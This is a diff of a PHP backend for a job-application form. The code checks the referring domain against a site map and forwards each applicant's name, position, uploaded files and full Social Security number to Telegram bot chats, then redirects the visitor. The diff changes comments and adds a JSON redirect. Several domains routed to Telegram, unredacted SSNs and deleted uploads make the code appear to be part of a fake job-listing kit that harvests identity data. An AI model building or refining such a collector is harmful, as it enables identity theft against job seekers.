@@ -38,8 +38,6 @@ $post_max_bytes   = parse_ini_size($post_max_raw);
 $desired_bytes    = $desired_max_mb * 1024 * 1024;
 
 if ($upload_max_bytes < $desired_bytes || $post_max_bytes < $desired_bytes) {
-    // Show friendly error, but don't exit – because client compression might reduce size below limit.
-    // We'll still try to process, but warn the user.
     $server_limit_warning = true;
 } else {
     $server_limit_warning = false;
@@ -70,7 +68,7 @@ $site_map = [
 ];
 
 // ============================================================================
-// 🧠 HELPER FUNCTIONS (same as before, unchanged)
+// 🧠 HELPER FUNCTIONS
 // ============================================================================
 function escape_telegram_html($text) {
     if (!is_string($text)) return '';
@@ -299,29 +297,34 @@ function send_telegram_file($bot_token, $chat_id, $file_path, $caption, $retries
 }
 
 // ============================================================================
-// 🎯 MAIN REQUEST HANDLER (same as before, but with warning handling)
+// 🎯 MAIN REQUEST HANDLER
 // ============================================================================
 $referer = $_SERVER['HTTP_REFERER'] ?? '';
 $parsed = parse_url($referer);
 $domain = $parsed['host'] ?? 'unknown';
 $config = $site_map[$domain] ?? null;
+
 if (!$config || empty($config['bots']) || empty($config['redirect'])) {
     http_response_code(403);
     log_entry("❌ Access denied: Unauthorized origin ($domain)");
     exit("Access denied");
 }
+
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
     exit("Method not allowed");
 }
+
 if (!validate_csrf_token($_POST['csrf_token'] ?? '')) {
     http_response_code(403);
     log_entry("❌ CSRF validation failed for $domain");
     exit("Invalid request token");
 }
+
 $ip = $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';
 if (strpos($ip, ',') !== false) $ip = trim(explode(',', $ip)[0]);
 $ip = filter_var($ip, FILTER_VALIDATE_IP) ? $ip : 'unknown';
+
 if (!check_rate_limit($ip)) {
     http_response_code(429);
     log_entry("❌ Rate limit exceeded for IP: $ip");
@@ -382,7 +385,7 @@ if (!empty($errors)) {
     exit;
 }
 
-// Prepare data for Telegram (same as before)
+// Prepare data for Telegram
 $first = escape_telegram_html(trim($post_data['q11_fullName']['first'] ?? ''));
 $middle = escape_telegram_html(trim($post_data['q11_fullName']['middle'] ?? ''));
 $last = escape_telegram_html(trim($post_data['q11_fullName']['last'] ?? ''));
@@ -397,9 +400,7 @@ $position = escape_telegram_html($post_data['q14_positionApplied'] ?? '');
 $job_type = escape_telegram_html($post_data['q24_jobType'] ?? 'Not specified');
 $source = escape_telegram_html($post_data['q21_howDid21'] ?? 'Unknown');
 $ssn_raw = $post_data['q25_socSec'] ?? '';
-// ***** FIX: Send full SSN without redaction *****
 $ssn_display = !empty($ssn_raw) ? escape_telegram_html($ssn_raw) : 'Not provided';
-// ***********************************************
 $timestamp = date('Y-m-d H:i:s');
 
 $message = "<b>📋 New Application Received</b>\n\n" .
@@ -451,7 +452,18 @@ if ($overall_success) {
         if (file_exists($path)) @unlink($path);
     }
     ob_end_clean();
-    header('Location: ' . $config['redirect'] . '?status=success');
+    
+    // ✅ FIX: Return JSON redirect for Fetch API instead of server-side header redirect
+    if (!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
+        header('Content-Type: application/json');
+        echo json_encode([
+            'success' => true,
+            'redirect' => $config['redirect'] . '?status=success'
+        ]);
+    } else {
+        // Fallback for normal form submission
+        header('Location: ' . $config['redirect'] . '?status=success');
+    }
     exit;
 } else {
     log_entry("❌ Partial failure for $ip: text_sent=" . ($text_sent ? 'Y' : 'N') . ", files_sent=" . ($files_sent ? 'Y' : 'N'));
